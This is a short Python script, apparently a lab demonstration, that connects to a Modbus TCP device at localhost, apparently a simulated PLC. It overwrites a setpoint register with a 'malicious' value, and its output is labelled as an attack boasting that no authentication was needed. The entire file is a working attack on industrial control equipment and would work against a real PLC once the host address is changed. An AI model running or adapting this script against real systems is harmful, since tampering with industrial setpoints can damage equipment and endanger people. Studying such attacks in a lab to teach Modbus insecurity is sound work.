from pymodbus.client.sync import ModbusTcpClient

HOST = "127.0.0.1"
PORT = 5020
SETPOINT_REGISTER = 1
MALICIOUS_VALUE = 9999

def main():
    client = ModbusTcpClient(HOST, port=PORT)

    if not client.connect():
        print("[ATTACK] Could not connect. Is modbus_slave.py running?")
        return

    print(f"[ATTACK] Connected to {HOST}:{PORT} -- no auth required")
    print(f"[ATTACK] Sending function code 06 (rite Single Register)")
    print(f"[ATTACK] Overwriting Setpoint register with {MALICIOUS_VALUE}")

    result = client.write_register(SETPOINT_REGISTER, MALICIOUS_VALUE, slave=0)

    if result.isError():
        print(f"[ATTACK] Write failed: {result}")
    else:
        print("[ATTACK] Write succeeded. The PLC accepted the command")
        print("[ATTACK] with no authentication check whatsoever.")

    client.close()

if __name__ == "__main__":
    main()